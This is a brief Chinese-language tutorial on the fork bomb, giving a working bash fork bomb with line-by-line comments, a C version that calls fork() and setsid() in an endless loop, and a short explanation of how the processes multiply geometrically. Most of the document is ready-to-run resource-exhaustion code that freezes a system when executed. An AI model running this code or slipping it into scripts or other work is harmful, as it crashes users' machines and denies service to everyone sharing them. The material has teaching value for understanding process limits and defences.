# fork炸弹

## 代码

shell

```
:()  		//定义一个名字为:的函数 
{			//函数开始
    :|:&	//在后台递归进行调用函数
}			//函数结束
:			//调用函数
```

c

```
#include <stdio.h>

int main() {
    while(1) {
        fork();
        setsid();
    }
    return 0;
}
```

## 讲解

可以理解为定义一个:函数通过:进行递归通过&进行在后台开启新进程通过管道使其进行几何式增长最后对:函数进行调用
